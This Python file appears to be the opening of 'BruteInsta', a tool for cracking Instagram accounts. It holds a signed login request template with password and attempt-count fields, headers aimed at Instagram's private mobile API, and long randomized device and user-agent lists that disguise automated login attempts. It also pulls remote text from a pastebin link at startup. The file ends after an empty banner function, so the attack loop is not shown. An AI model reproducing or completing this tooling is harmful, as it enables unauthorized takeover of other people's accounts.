"""
    @ open source by ---( Younis john )---
    @ Github : https://github.com/younis-dgk
    @ facebook : https://www.facebook.com/YounisDgk
    
"""
import os,requests,json,random,re,datetime,time,rich,sys,hmac,uuid,urllib,urllib.request,hashlib
from platform import platform
from datetime import datetime
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console as sol
from rich.columns import Columns
from rich.panel import Panel as nel
from rich import print as prints
try:
    os.mkdir("result")
except:pass
CY="[96;1m"
H="[1;32m"
M="[1;31m" 
K="[1;33m" 
U="[1;35m" 
O="[38;2;255;127;0;1m"
C="[0m" 
N="[0m"
day=datetime.now().strftime("%d-%b-%Y")
kntlllll = "tai"

logo = """
    ____             __       ____           __       
   / __ )_______  __/ /____  /  _/___  _____/ /_____ _
  / __  / ___/ / / / __/ _ \ / // __ \/ ___/ __/ __ `/
 / /_/ / /  / /_/ / /_/  __// // / / (__  ) /_/ /_/ / 
/_____/_/   \__,_/\__/\___/___/_/ /_/____/\__/\__,_/  
"""
EXAL={}
sianjing="signed_body=||.%7B%22phone_id%22%3A%22||%22%2C%22_csrftoken%22%3A%22||%22%2C%22username%22%3A%22||%22%2C%22guid%22%3A%22||%22%2C%22device_id%22%3A%22||%22%2C%22password%22%3A%22||%22%2C%22login_attempt_count%22%3A%22||%22%7D&ig_sig_key_version=4"
menudump=[]
loop,success,checkpoint=0,[],[]
internal,external=[],[]
uagent=[]
xyz=requests.get("https://pastebin.com/raw/97p39Sn3").text

IGV = "100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129"
def UserAgent():
    rr=random.randint
    rc=random.choice
    andro=rc(["24/7.0","26/8.0.0","23/6.0.1","22/5.1.1","21/5.0.1","21/5.0.2","25/7.1.1","19/4.4.4","21/5.0","19/4.4.2","27/8.1.0","28/9","29/10","26/9","29/10","30/11","25/7.1.2"])
    dpis=rc(["320dpi","640dpi","213dpi","480dpi","420dpi","240dpi","280dpi","160dpi","560dpi","540dpi","272dpi","360dpi","720dpi","270dpi","450dpi","600dpi","279dpi","210dpi","180dpi","510dpi","300dpi","454dpi","314dpi","288dpi","401dpi","153dpi","267dpi","345dpi","493dpi","340dpi","604dpi","465dpi","680dpi","256dpi","290dpi","432dpi","273dpi","120dpi","200dpi","367dpi","419dpi","306dpi","303dpi","411dpi","195dpi","518dpi","230dpi","384dpi","315dpi","293dpi","274dpi","235dpi"])
    pxl=rc(["720x1280","1440x2560","1440x2768","1280x720","1280x800","1080x1920","540x960","1080x2076","1080x2094","1080x2220","480x800","768x1024","1440x2792","1200x1920","720x1384","1920x1080","720x1369","800x1280","720x1440","1080x2058","600x1024","720x1396","2792x1440","1920x1200","2560x1440","1536x2048","720x1382","1080x2113","1080x2198","1080x2131","720x1423","1080x2069","720x1481","1080x2047","1080x2110","1080x2181","1080x2209","1080x2180","1080x2020","1080x2095","1440x2723","1080x2175","720x1365","1440x2699","1080x2218","2699x1440","1440x2907","1080x2257","720x1370","1080x2042","720x1372","1080x2200","1080x2186","720x1361","1080x2024","1080x2006","720x1402","1440x2831","720x1454","1080x2064","1440x2933","720x1411","720x1450","1440x2730","1080x2046","2094x1080","540x888","1440x2759","1080x2274","1080x2178","1440x2706","720x1356","720x1466","1440x2900","2560x1600","1080x2038","1600x2452","1080x2129","720x1422","720x1381","1080x2183","1080x2285","800x1216","1080x2216","1080x2168","1080x2119","1080x2128","1080x2273","2274x1080","1080x2162","1080x2164","2076x1080","1024x768","1080x2173","1440x2845","1080x2134","720x1379","1440x2838","1080x2139","2131x1080","1440x2744","1080x2192","720x1406","1440x2960","1080x2029","2042x1080","1080x2212","1406x720","1080x2288","2047x1080","1080x2051","720x1398","1280x736","1382x720","720x1353","1080x2050","1080x2028","1080x2256","2711x1440","2175x1080","1080x2281","2560x1492","1440x2923","1200x1845","1080x2189","1080x2002","1440x2711","2110x1080","960x540","1080x2033","2200x1080","720x1452","720x1480","1440x2735","720x1472","1080x2277","1080x2169","2874x1440","1600x2560","1080x2151","2218x1080","1080x2182","720x1468","1440x2898","1080x2011","1080x2201","720x1380","1080x2287","2069x1080","1200x1836","2046x1080","720x1439","2058x1080","2182x1080","720x1399","1080x2282","1440x2721","1080x2324","720x1432","1080x2165","1080x2150","1080x2156","1080x1872","1440x3048","1532x2560","720x1355","720x1390","720x1476","720x1410","1080x2032","720x1437","1440x2682","1440x2921","1080x2270","1080x2160","720x1446","1200x1848","1440x2874","1080x2309","1080x2174","1440x2867","1080x2060","1080x2196","1080x2401","1536x1922","1080x2280","1080x2123","720x1435","1440x2927","1080x2276","720x1448","720x1469","720x1344","1080x2187","540x937","1440x3028","1080x2184","1440x2718","1080x2326","840x1834","1440x2935","1440x2880","1440x2892","2048x2048","1080x2195","1080x2322","720x1419","987x1450","1080x2092","1440x3047","720x1358","1080x2136","720x1357","1080x2093","720x1477","1080x2312","1080x2361","720x1341","720x1507","1080x2172","720x1337","1080x2177","1080x2125","1440x2891","1600x2434","720x1394","1080x2159","720x1387","1080x2166","1080x2154","1080x2147","1440x2747","1080x2105","1440x2911","720x1473","1080x2055","1080x2265","720x1436","1080x2190","1600x2526","720x1373","720x1415","1080x2249","1080x2254","720x1455","1440x3040","1080x2149","720x1385","1440x3036","1080x2111","1440x2904","720x1442","720x1377","1080x2307","1080x2327","1080x2141","1080x2025","720x1430","720x1375","1080x2283","1440x2779","1080x2321","1080x2268","1440x2758","1752x2698","1080x2267","1200x1856","1440x2756","720x1464","1080x2234","1080x2171","1080x2155","720x1463","1080x2122","720x1467","1080x2264","720x1349","1440x2999","720x1458","1080x2015","720x1431","1242x2208","1080x2185","1080x2148","1080x2163","1440x2780","720x1445","1080x2146","1200x1916","720x1502","1200x1928","720x1506","720x1424","720x1465","720x1420","1080x2176","720x1521","1080x2315","1080x2400","720x1471","1080x2157","1600x2458","1080x2067","1080x2191","1080x2271","720x1407","800x1208","1080x2087","1080x2199","578x1028","720x1485","540x879","1080x2179","720x1555","810x1598","720x1378","1200x1897","720x1395","720x1459","900x1600","1080x2275","1440x2733"])
    basa=rc(["ru_RU","en_GB","uk_UA","en_US","de_DE","it_IT","ru_UA","ar_AE","tr_TR","lv_LV","th_TH","fr_FR","sr_RS","hu_HU","bg_BG","pt_PT","pt_BR","es_ES","en_IE","nl_NL","fr_CH","de_CH","es_US","fr_CA","ru_BY","en_PH","en_AU","hy_AM","fa_IR","de_AT","cs_CZ","ru_KZ","en_CA","fr_BE","az_AZ","en_NZ","en_ZA","es_LA","ru_KG","pl_PL","es_MX","ro_RO","el_GR","iw_IL","in_ID","ga_IE","en_IN","ar_SA","ka_GE","es_CO","es_SV","hr_HR","ar_JO","es_PE","it_SM","ar_AR","en_SE","nb_NO","sk_SK","bs_BA","nl_BE","uz_UZ","sl_SI","es_CL"])
    kode=rc(["104766893","104766900","102221278","104766888","105842053","93117670","94080607","96794592","102221279","100986894","ru_RU","94080606","103516660","98288242","103516666","103516653","uk_UA","96794590","100986893","102221277","95414344","99640920","99640911","96794591","ru_UA","99640905","100986890","107092313","99640900","93117667","100521966","90841939","98288239","89867440","105842051","de_DE","96794584","105842050","en_US","pt_PT","109556223","107092318","en_GB","108357722","112021130","107092322","119104798","108357720","119104802","112021131","100986892","113249569","107104231","fr_FR","pt_BR","109556226","116756948","113249553","113249561","110937441","118342010","120662545","117539703","119875222","110937448","121451799","115994877","108357718","120662547","107608058","122206624","95414346","107092308","112021128","90841948","119875229","117539698","120662550","en_NZ","123103748","91882538","121451810","91882537","118342006","113948109","122338251","110937453","es_US","118342005","121451793","109556219","119875225","en_CA","109556220","117539695","115211358","91882539","119104795","89867442","94080603","164094539","175574628","185203690","188791648","188791674","187682694","188791643","177770724","192992577","180322810","195435560","196643820","196643821","188791637","192992576","196643799","196643801","196643803","195435546","194383411","197825254","197825260","197825079","171727793","197825112","197825012","197825234","179155086","192992563","197825268","166149669","192992565","198036424","197825223","183982969","199325909","199325886","199325890","199325911","197825118","127049003","197825169","197825216","197825127","200395960","179155096","199325907","200396014","188791669","197825133","170693926","200396005","171727780","201577064","201576758","201577192","201775949","201576944","201775970","143631574","126223520","201775951","167338518","144612598","170693940","201775813","200395971","201775744","201775946","202766609","145652094","202766591","202766602","203083142","179155088","202766608","199325884","180322802","202766603","195435547","165030894","201576967","201775904","194383424","197347903","202766610","185203693","201576898","204019468","187682682","204019456","201775901","204019471","204019454","204019458","202766601","204019452","173238721","204019466","148324036","202766581","158441904","201576903","205280538","205280529","201576813","173238729","141753096","205280531","163022072","201576887","163022088","141753091","148324051","205280528","154400383","205280537","201576818","157405371","205858383","201576811","165031093","187682684","145652090","206670917","185203686","192992561","183982986","206670927","150338061","183982962","127049016","175574603","155374054","205858247","135374896","206670920","169474958","206670926","160497905","161478672","192992578","206670929","131223243","206670916","142841919","187682681","171727795","151414277","206670922","160497915","207505137","165030898","208061741","208061688","208180365","208061674","197825052","147375133","208061744","196643798","208061725","122338247","157536430","208061728","209143963","208727155","209143726","205280539","209143903","209143970","181496409","208061739","209143957","210180522","210180512","209143881","209143712","180322805","210180521","195435561","210370119","210180523","210180493","175574596","210180510","210180480","210180513","210180517","176649504","177770663","210180479","211114117","210908379","206670921","211114134","183982943","211399345","211399342","211399332","201775962","211574187","211574249","210180519","167338559","185203649","124583960","211399337","211399335","197825163","166149717","211399336","212063371","211399329","209143954","210180482","168361634","212214017","209143867","211399341","211399340","212214027","195435510","122338243","139237670","152367502","212676872","212676898","212676875","212676895","212676901","209823384","212676869","196643822","212676878","213367980","213368005","212676886","213558743","209143913","212214039","158441917","174081672","213558750","201775966","188791681","185203705","143631575","161478664","214245350","161478663","212676881","213558770","214245346","138226752","214245221","214245182","214245206","214245218","214245354","214245295","214245199","214245304","214245280","214446313","214245187","214245288","214139002","202766605","214245319","214646783","158441914","215246048","195435544","208061677","215464400","128676146","215464389","215464385","215464390","215464398","182747397","215464393","216233197","201775791","216817344","215464395","216817286","185203642","164094529","216817305","215464401","162439029","215464382","216817280","216817331","214330969","216817299","216817357","217948981","217948980","217948956","217948959","217948968","216817296","217948952","217948982","216817269","219308759","219308726","182747387","219308721","219308754","219308763","176649435","183982982","219909486","127049038","219308730","221134012","221134032","221134009","221134037","194383426","221134029","221134005","221134018","145652093","225283632","165031108","225283625","224652582","139906580","225283628","225283624","226142579","225283634","225283631","226493211","225283623","185203672","156514151","218793478","225283621","227299063","225283627","227299064","227299021","227299027","227544546","227299041","227299060","227299012","228970707","228970705","227299005","228970687","228970683","228970694","228970710","228970689","160497904","195435540","129611419","229783842","230291708","228970681","148324047","230877709","231192211","230877674","230877705","230877678","211399328","209143896","230877713","194383428","230877689","221134002","231457747","208061721","230877671","230877668","232868027","232088496","185203706","232868005","232867964","232868001","232868015","232868031","232867959","232868009","164094526","232867941","234041364","182747399","232868024","232867949","234847239","234847238","234847234","162439040","234847229","234847230","181496427","234847240","232867993","195435558","232867967","232867997","234847227","235871830","221133998","236572344","236572377","153386780","236572337","236572349","236572372","234847226","236572383","237507050","238093993","238093948","238093954","238093999","238093982","239490565","239490555","238093946","238093966","239490563","239490550","239974660","240726416","239490568","240726484","240726452","239490551","239490548","240726426","240726476","240726491","240726471","241043882","241114613","236572331","241267273","240726407","241456456","241267278","241267269","241114619","241456445","241456451","242168941","242168928","242168931","242168939","242168925","240726436","242375239","144722090","242168935","242290370","157405369","242168933","242290355","242703240","242807362","242168923","242168943","242991209","243646252","243646269","242991200","243711120","243646267","243711093","243975802","243646263","243646248","243646255","244167578","128676156","194383413","243975835","244390417","244390338","245196084","245196061","240726392","245196055","243646273","245196082","245196063","245196070","245666450","245466705","245870319","245870301","245870347","245196087","246889064","246889072","246889073","246889074","246889065","247146500","246889063","245870262","247370962","247146481","246889068","246889062","247541884","247541831","247370955","247370942","247720736","247720751","248310216","248310220","248310208","247720744","248399342","248310210","247720747","248310206","248717751","248310212","248310221","248823392","248583561","248310205","248899028","248955251","248955247","249178904","248955244","249507608","249507582","249507588","249507585","248955240","249507607","249507592","249810008","249966137","249507610","249966081","249966100","249507599","249966140","249810004","123790722","250188776","249628096","250188788","250742103","250742113","250742102","250877984","250742105","250742111","251048681","250742107","250742115","251048695","251304696","251304682","251524431","251530710","251304689","251524420","251524409","251524390","250742101","251048673","252055918","252055945","251920416","252055944","252055925","252239038","252055936","252055915","252055948","252390568","252390583","252580134","252740497","252740485","252740490","253120615","253325372","253325384","253325385","253447816","253146263","253120607","253325374","253120598","253325371","253447808","253447809","253325378","253447814","253447807","253447811","253447817","253447813","181496411","253447806","255191971","255013798","255777478","255777471","255777474","255777472","255959637","255777477","255959614","255959635","256099199","256099204","150338064","256099153","256099205","256099156","255983744","256107300","255777470","126223536","256203326","256099190","256099151","256324061","256324047","256203339","256966628","256966589","256966626","256966590","124584015","257456576","256966593","257456590","256966629","256966587","256966592","257456586","257456539","259829115","259829104","259829113","260037038","259829105","259829109","260037030","260149625","259829103","260149621","260465044","259829116","260724710","179155058","261079769","261079761","261079768","261079762","261079771","261276939","157405370","135374885","261079765","261393056","261393062","261079760","181496406","182747360","261504698","261690888","261504706","169474957","262218766","262290715","262290774","262372432","262372425","262372431","262886993","262886995","262372426","262886987","261079764","262886986","262886988","262886990","262372433","262886996","263652962","264009049","264009019","264009030","264009021","264009023","264009052","264009024","261763534","174081651","169474965","232867942","264009013","255959606","264009028","267397344","267397322","267925737","267397343","267925708","267397327","267397321","267925714","267258517","267925705","268773287","267925733","268773233","267925702","268773286","159526770","268773239","268773272","269790795","269285030","269790805","269790803","269790792","268773227","269849047","270426177","270426174","271182277","269790789","271182270","268773290","271182266","271182276","269790798","271182279","271182265","271182267","269790807","271823819","272382110","272382111","272382106","272693584","272382095","272382093","272382098","272382100","272382103","273728833","273371577","273728832","273728798","273907093","273907111","273907108","238093987","273907112","273907103","274774869","274774891","274774908","273907087","274774904","274774875","274774914","275292626","276027938","276028040","276027963","276028037","276028020","276028017","274774862","276028013","249507580","276028029","273907098","277249238","277249248","277249249","276028033","277249250","277249226","275292623","277249214","277249242","277249237","277249240","278625447","278002558","278625420","278625431","278625423","117539687","278625416","278625444","277249213","278625451","279469964","279996068","279996060","279996067","279996058","280194220","279996065","279996063","279996061","279996059","280894196","273728787","271182262","281579032","281579023","276514494","281579021","281579027","281579033","268773274","283072590","281579025","283072571","282619332","283489774","283072587","283072567","281579031","283072580","283072574","284459213","284459224","179155089","256966583","284459214","283072585","284459218","284459223","284459225","285338607","275113919","284459221","284459212","284459215","285855793","285855800","285855803","285855791","285855802","285855804","285855795","286809973","287420974","287421023","287420968","287420979","287421017","287421005","287421019","287421012","277249241","288682406","287421026","288682405","288682397","288682407","261079772","288682398","288682401","288205409","289692198","287420997","289692186"])
    igv="42.0.0.19.95,42.0.0.19.95,42.0.0.19.95,40.0.0.14.95,42.0.0.19.95,42.0.0.19.95,43.0.0.10.97,42.0.0.19.95,42.0.0.19.95,33.0.0.11.92,45.0.0.17.93,43.0.0.10.97,45.0.0.17.93,43.0.0.10.97,20.0.0.29.75,46.0.0.15.96,48.0.0.15.98,47.0.0.16.96,47.0.0.16.96,24.0.0.12.201,44.0.0.9.93,54.0.0.14.82,23.0.0.14.135,28.0.0.7.284,51.0.0.20.85,24.0.0.12.201,45.0.0.17.93,55.0.0.12.79,28.0.0.7.284,55.0.0.12.79,55.0.0.12.79,48.0.0.15.98,46.0.0.15.96,27.0.0.11.97,55.0.0.12.79,56.0.0.13.78,27.0.0.11.97,44.0.0.9.93,45.0.0.17.93,27.0.0.11.97,24.0.0.12.201,56.0.0.13.78,51.0.0.20.85,44.0.0.9.93,32.0.0.16.94,44.0.0.9.93,45.0.0.17.93,48.0.0.15.98,46.0.0.15.96,24.0.0.12.201,23.0.0.14.135,43.0.0.10.97,45.0.0.17.93,44.0.0.9.93,48.0.0.15.98,46.0.0.15.96,25.0.0.26.136,49.0.0.15.89,12.0.0.7.91,49.0.0.15.89,32.0.0.16.94,24.0.0.12.201,43.0.0.10.97,44.0.0.9.93,54.0.0.14.82,25.0.0.26.136,25.0.0.26.136,56.0.0.13.78,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,23.0.0.14.135,32.0.0.16.94,46.0.0.15.96,23.0.0.14.135,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,27.0.0.11.97,48.0.0.15.98,27.0.0.11.97,49.0.0.15.89,45.0.0.17.93,55.0.0.12.79,43.0.0.10.97,27.0.0.11.97,59.0.0.23.76,43.0.0.10.97,48.0.0.15.98,24.0.0.12.201,48.0.0.15.98,30.0.0.12.95,48.0.0.15.98,34.0.0.12.93,24.0.0.12.201,48.0.0.15.98,40.0.0.14.95,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,28.0.0.7.284,46.0.0.15.96,44.0.0.9.93,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,10.30.0,45.0.0.17.93,24.0.0.12.201,48.0.0.15.98,26.0.0.13.86,22.0.0.17.68,46.0.0.15.96,40.0.0.14.95,103.1.0.15.119,113.0.0.39.122,121.0.0.29.119,121.0.0.29.119,123.0.0.21.114,123.0.0.21.114,122.0.0.29.238,123.0.0.21.114,123.0.0.21.114,115.0.0.26.111,124.0.0.17.473,122.0.0.29.238,117.0.0.28.123,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,123.0.0.21.114,124.0.0.17.473,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,125.0.0.20.126,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,110.0.0.16.119,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,116.0.0.34.121,124.0.0.17.473,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,105.0.0.18.119,128.0.0.26.128,124.0.0.17.473,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,129.0.0.2.119,128.0.0.26.128,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,120.0.0.29.118,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,66.0.0.11.101,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,130.0.0.31.121,116.0.0.34.121,127.0.0.30.121,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,124.0.0.17.473,129.0.0.29.119,129.0.0.29.119,130.0.0.31.121,128.0.0.26.128,130.0.0.31.121,130.0.0.31.121,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,109.0.0.18.124,113.0.0.39.122,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,129.0.0.29.119,126.0.0.25.121,130.0.0.31.121,129.0.0.29.119,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,110.0.0.16.119,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,127.0.0.30.121,130.0.0.31.121,131.0.0.23.116,131.0.0.23.116,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,130.0.0.31.121,8.4.0,131.0.0.23.116,131.0.0.25.116,129.0.0.29.119,82.0.0.13.119,129.0.0.29.119,65.0.0.12.86,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,124.0.0.17.473,36.0.0.13.91,106.0.0.24.118,131.0.0.25.116,131.0.0.25.116,83.0.0.20.111,131.0.0.25.116,109.0.0.18.124,36.0.0.13.91,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,84.0.0.21.105,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,133.0.0.7.120,116.0.0.34.121,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,117.0.0.28.123,123.0.0.21.114,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,104.0.0.21.118,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,125.0.0.20.126,132.0.0.26.134,132.0.0.26.134,128.0.0.19.128,132.0.0.26.134,121.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,122.0.0.29.238,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,131.0.0.25.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,128.0.0.26.128,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,123.0.0.21.114,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,133.0.0.32.120,123.0.0.21.114,133.0.0.32.120,131.0.0.23.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,133.0.0.32.120,111.1.0.25.152,133.0.0.32.120,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,130.0.0.31.121,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,87.0.0.18.99,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,97.0.0.32.119,131.0.0.25.116,129.0.0.29.119,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,111.1.0.25.152,129.0.0.29.119,134.0.0.26.121,131.0.0.25.116,134.0.0.26.121,134.0.0.26.121,84.0.0.21.105,127.0.0.30.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,80.0.0.14.110,133.0.0.32.120,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,102.0.0.20.117,131.0.0.23.116,131.0.0.25.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,102.0.0.20.117,80.0.0.14.110,87.0.0.18.99,134.0.0.26.121,93.1.0.19.102,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,96.0.0.28.114,129.0.0.29.119,131.0.0.25.116,131.0.0.23.116,135.0.0.15.119,124.0.0.17.473,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,131.0.0.25.116,131.0.0.23.116,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,130.0.0.31.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,131.0.0.23.116,104.0.0.21.118,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,127.0.0.30.121,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,133.0.0.32.120,123.0.0.21.114,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,84.0.0.21.105,131.0.0.23.116,133.0.0.32.120,128.0.0.26.128,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121"
    igve=igv.split(",")
    versi=random.choice(igve)
    ua1=f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; INFINIX MOBILITY LIMITED/Infinix; Infinix X657B; Infinix-X657B; mt6761; in_ID; {kode})'
    ua2=f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; vivo; vivo 1820; 1820; mt6762; {basa}; {kode})'
    ua3=f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; OPPO; CPH2109; OP4BA5L1; qcom; {basa}; {kode})'
    ua4=f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi/xiaomi; Redmi Note 8; ginkgo; qcom; {basa}; {kode})'
    uaa=rc([ua1,ua2,ua3,ua4])
    return uaa
def headCrack(IGV):
    headers={
        "Host":"i.instagram.com",
        "content-length":"456",
        "x-ig-connection-type":"MOBILE(LTE)",
        "x-ig-capabilities":"3Q==",
        "accept-language":"in-ID",
        "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
        "user-agent":UserAgent(),
        "accept-encoding":"gzip, deflate"}
    return headers
def headCrack2(IGV):
    headers={
        "Host":"i.instagram.com",
        "content-length":"516",
        "x-ig-connection-type":"WIFI",
        "x-ig-capabilities":"3Q==",
        "accept-language":"in-ID",
        "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
        "user-agent":UserAgent(),
        "accept-encoding":"gzip, deflate"}
    return headers
def headers():
    head={
        "user-agent":"Mozilla/5.0 (Linux; Android 10; SM-A920F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 Instagram 243.0.0.16.111 Android (29/10; 420dpi; 1080x2094; samsung; SM-A920F; a9y18qlte; qcom; in_ID; 382290498)"
}
    return head
def clear():
    os.system("cls" if os.name=="nt" else "clear")
def banner():
    clear()
